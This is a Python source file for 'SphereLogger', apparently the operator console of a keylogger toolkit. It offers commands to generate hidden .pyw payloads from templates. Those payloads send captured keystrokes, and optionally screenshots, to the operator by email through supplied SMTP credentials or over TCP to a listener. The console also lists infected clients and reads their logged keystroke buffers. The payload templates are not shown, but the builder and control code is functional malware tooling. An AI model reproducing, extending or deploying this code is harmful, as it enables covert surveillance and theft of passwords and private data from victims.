# -*- coding: utf-8 -*-

from SPLib import c_blue, c_green, c_magenta, c_red, c_yellow, \
    logo, send_test_mail, template_txt, Listener, tcp_template_txt

from socket import gethostname, gethostbyname

import cmd
import prettytable
import time


class SphereShell(cmd.Cmd):

    prompt = c_magenta('>> ')
    doc_leader = ''
    nohelp = 'No help on "%s"'
    license = 'https://github.com/Emberium/SphereLogger'

    def __init__(self):
        print(c_yellow(logo))
        print(c_magenta('Welcome to SphereLogger! Type help to get available commands!'))

        self.listener = None
        self.payload_types = ['mail', 'tcp']

        super().__init__()

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""

        print('\033[1;32m', end='')
        super().do_help(arg)
        print('\033[0m', end='')

    def do_license(self, t):
        """Shows licence."""
        print(c_blue("License on " + self.license))

    def do_start_tcp(self, port):
        """Starts tcp listener (start_tcp <port>)."""
        if not port.isdigit():
            print(c_red('Incorrect port.'))

        else:
            if self.listener is None:
                print(c_green('Starting listener...'))
                print(c_green('SERVER(PORT) -> ' + port))
                self.listener = Listener(int(port))
                self.listener.start_listener()
                print(c_green('Server started!'))

            else:
                print(c_green('Closing socket...'))
                self.listener.exit = True
                self.listener.socket.close()
                print(c_green('Starting listener...'))
                self.listener = Listener(int(port))

    def do_read(self, l):
        """Reads connection."""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif self.listener.conn is None:
            print(c_green('Use connect <ip> to connect.'))

        else:
            try:
                while True:
                    time.sleep(0.1)
                    data = self.listener.listen()

                    if data is None:
                        continue

                    elif data['cmd'] == 'buffer':
                        print(c_blue('SAVED IN BUFFER:\n'+data['data']))

                    elif data['cmd'] == 'upd':
                        print(c_blue(data['data']))

            except KeyboardInterrupt:
                print(c_green('Closing listener...'))

            except Exception as e:
                print(c_red(e))

    def do_conns(self, line):
        """Connections list."""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif not self.listener.clients:
            print(c_green('No connected clients.'))

        else:
            table = prettytable.PrettyTable([c_yellow("No."), c_green("IP")])
            i = 1

            for client in self.listener.clients:
                table.add_row([c_yellow(str(i)), c_green(client)])
                i += 1

            print(table)

    def do_connect(self, ip):
        """Connects to client. connect <ip>"""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif ip not in self.listener.clients:
            print(c_green('Client not found.'))

        else:
            self.listener.conn = self.listener.clients[ip]
            print(c_green('CONNECTION -> ' + ip))

    def do_exit(self, t):
        """Exit."""
        print(c_green('Thanks for using Sphere Logger!'))

        return True

    def do_gen(self, line):
        """Generates payload. gen <type>. Allowed types: mail"""

        screen_logger = False

        if line not in self.payload_types:
            print(c_red('Unknown type: %s' % line))

        elif line == 'tcp':
            ip = input(c_green('Your ip (Press Enter to use %s):' % gethostbyname(gethostname())))

            if not ip:
                ip = gethostbyname(gethostname())

            port = input(c_green('Server\'s port: '))

            if not port.isdigit():
                print(c_red('Incorrect port.'))
                return

            file = input(c_green('Enter output filename: '))

            if not (file.endswith('.py') or file.endswith('.pyw')):
                file += '.pyw'

            with open('templates/tcp-template.py', 'r') as f:
                template = f.read()

            with open('output/'+file, 'w') as f:
                f.write(tcp_template_txt.format(
                    port=port,
                    host=ip
                ) + template)

            print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))

        elif line == 'mail':

            addr = input(c_green('Sender mail address: '))
            password = input(c_green('Sender\'s password: '))
            server = input(c_green('SMTP Server: '))
            port = input(c_green('SMTP Port: '))

            if not port.isdigit():
                print(c_red('Incorrect port.'))
                return

            rc = input(c_green('Receiver\'s mail address: '))

            if input(c_green('Do you want to send test mail? (Y/n)')).upper() == 'Y':
                if not send_test_mail(addr, password, server, rc, port):
                    print(c_red('Sending Error!'))
                    return

                else:
                    print(c_blue('Sending successful! Check your mail!'))

            if input(c_green('Do you want to send screen shots with logs? (Y/n)')).upper() == 'Y':
                screen_logger = True

            file = input(c_green('Output filename: '))

            if not (file.endswith('.py') or file.endswith('.pyw')):
                file += '.pyw'

            with open('templates/mail-screen-logger-template.py' if screen_logger else 'templates/mail-template.py', 'r'
                      ) as f:
                template = f.read()

            with open('output/' + file, 'w', encoding='utf-8') as f:
                f.write(template_txt.format(
                    login=addr,
                    password=password,
                    smtp=server,
                    port=port,
                    rec=rc
                ) + template)

            print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))

    def default(self, line):
        self.stdout.write(c_red('Unknown syntax: %s.\n' % line))
